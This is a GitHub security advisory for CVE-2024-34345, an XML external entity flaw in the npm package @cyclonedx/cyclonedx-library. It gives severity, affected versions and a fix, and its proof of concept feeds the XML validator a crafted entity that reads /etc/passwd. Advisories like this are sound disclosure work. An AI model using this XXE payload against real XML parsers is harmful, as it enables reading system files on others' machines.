# [H] @cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability

## Summary
Severity: High
Advisory: GHSA-38gf-rh2w-gmj7
CVE: CVE-2024-34345
CWE: CWE-611
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-05-08
Source: https://github.com/advisories/GHSA-38gf-rh2w-gmj7
Type: github-advisory

## Affected
- npm: `@cyclonedx/cyclonedx-library` — affected >=6.7.0 <6.7.1

## Details
### Impact

XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.

#### POC

```js
const {
  Spec: { Version },
  Validation: { XmlValidator }
} = require('@cyclonedx/cyclonedx-library');

const version = Version.v1dot5;
const validator = new XmlValidator(version);
const input = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE poc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<bom xmlns="http://cyclonedx.org/schema/bom/1.5">
  <components>
    <component type="library">
      <name>testing</name>
      <version>1.337</version>
      <licenses>
        <license>
          <id>&xxe;</id><!-- << XML external entity (XXE) injection -->
        </license>
      </licenses>
    </component>
  </components>
</bom>`;

// validating this forged(^) input might lead to unintended behaviour
// for the fact that the XML external entity would be taken into account.
validator.validate(input).then(ve => {
  console.error('validation error', ve);
});
```

### Patches

This issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1 `.



### Workarounds

Do not run the provided XML validator on untrusted inputs.

### References

* issue was introduced via <https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063>.

## References
- https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7
- https://nvd.nist.gov/vuln/detail/CVE-2024-34345
- https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063
- https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203
- https://github.com/CycloneDX/cyclonedx-javascript-library
